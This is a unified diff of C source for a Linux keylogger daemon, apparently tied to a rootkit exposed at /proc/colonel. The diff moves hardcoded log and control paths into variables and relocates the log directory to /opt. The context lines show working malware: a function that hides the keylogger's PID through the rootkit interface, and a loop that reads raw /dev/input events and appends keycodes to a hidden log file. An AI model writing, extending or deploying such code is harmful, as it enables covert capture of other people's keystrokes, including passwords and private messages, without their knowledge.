@@ -15,7 +15,9 @@
 #include <stdarg.h>
 
 FILE *error_log;										/* error log */
-FILE *evlog;											/* device input log */
+FILE *evlog;	
+char *evlog_path = "/opt/col_log/evlog.txt"; 
+char *control_path = "/proc/colonel";
 
 void daemonize(void) {
 	pid_t process_id = 0;
@@ -45,7 +47,7 @@ void daemonize(void) {
 }
 
 int setup_dirs(void) {
-    return mkdir("./col_log", S_IRWXU | S_IRGRP | S_IXGRP | S_IROTH | S_IXOTH);			/* log directory */
+    return mkdir("/opt/col_log/", S_IRWXU | S_IRGRP | S_IXGRP | S_IROTH | S_IXOTH);		/* log directory */
 }
 
 int hide_pid(void) {
@@ -54,7 +56,7 @@ int hide_pid(void) {
 	time_t curtime;
 	time(&curtime);										/* set the current time */
 	
-       	int control_file = open("/proc/colonel", O_WRONLY);					/* open for write to hide keylogger pid */
+       	int control_file = open(control_path, O_WRONLY);					/* open for write to hide keylogger pid */
 	if (-1 == control_file) {
 		fprintf(error_log, "ERROR: /proc/colonel not found -- %s", ctime(&curtime));
 		exit(1);
@@ -82,7 +84,7 @@ int system_timestamp(void) {
 	uname(&unameData);									/* provides system information */
 	time_t curtime;
 	time(&curtime);										/* set the current time */
-	evlog = fopen("./col_log/evlog.txt", "a+"); 				/* key log */
+	evlog = fopen(evlog_path, "a+"); 							/* key log */
 	if (NULL == evlog) {
 		fprintf(error_log, "ERROR: evlog couldn't be opened -- %s", ctime(&curtime));
 		exit(1);
@@ -119,7 +121,7 @@ void key_listen(void) {
 			fprintf(error_log, "ERROR: Could not read from /dev/input/event\n");
 			exit(1);
 		}
-		control_file = open("/proc/colonel", O_RDONLY);         			/* read from /proc/colonel */
+		control_file = open(control_path, O_RDONLY);         				/* read from /proc/colonel */
 		if (-1 == control_file) {
 			fprintf(error_log, "ERROR: Could not open control_file -- %s.\n", ctime(&curtime));
 			exit(1);
@@ -138,14 +140,14 @@ void key_listen(void) {
 			continue;
 
 		} else if ((1 == ev.type) && (1 == listening)) {	                	/* if typing and keylogger is on */
-        		evlog = fopen("./col_log/evlog.txt", "a+"); 				/* key log */
+        		evlog = fopen(evlog_path, "a+"); 					/* key log */
 			if (NULL == evlog) {
                 		fprintf(error_log, "ERROR: evlog couldn't be opened -- %s", ctime(&curtime));
                 		exit(1);
             		}	
             		fprintf(evlog, "%i,%i-", ev.code, ev.value);     			/* grabs keyboard input */
 			fflush(evlog);
-			int control_file2 = open("/proc/colonel", O_RDONLY | O_NONBLOCK);
+			int control_file2 = open(control_path, O_RDONLY | O_NONBLOCK);
 			if (-1 == control_file2) {
 				fprintf(error_log, "ERROR: Could not open control_file2 -- %s.", ctime(&curtime));
 				exit(1);
@@ -170,17 +172,17 @@ void key_listen(void) {
 
 int main(void) {
 	time_t curtime;
-	time(&curtime);										/* set the current time */
-
+	time(&curtime);	
+	
 	setup_dirs();
 
-	error_log = fopen("./col_log/log.txt", "a+"); 						/* daemon log */
+	error_log = fopen("/opt/col_log/log.txt", "a+"); 					/* daemon log */
 	if (NULL == error_log) {
                 fprintf(error_log, "ERROR: error_log couldn't be opened -- %s", ctime(&curtime));
                 exit(1);
         }	
 
-        evlog = fopen("./col_log/evlog.txt", "a+");		 				/* key log */
+        evlog = fopen(evlog_path, "a+");		 					/* key log */
 	if (NULL == evlog) {
                 fprintf(error_log, "ERROR: evlog couldn't be opened -- %s", ctime(&curtime));
                 exit(1);
